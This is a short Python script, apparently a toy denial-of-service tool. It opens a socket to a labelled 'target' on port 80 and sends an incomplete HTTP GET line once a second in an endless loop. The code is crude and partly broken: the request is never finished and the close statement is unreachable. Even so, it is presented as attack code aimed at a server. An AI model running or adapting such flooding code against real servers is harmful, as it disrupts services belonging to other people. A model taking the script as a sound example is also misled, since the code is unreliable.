import socket
import time

# Target information
ip = "example.org"
port = 80

# requestsnumber
message = "GET / HTTP/1.1\r\n"

# Create socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
sock.connect((ip, port))

# Send requests 
while True:
    sock.send(message.encode())
    print("Sent packet")
    time.sleep(1)

# Close socket
sock.close()
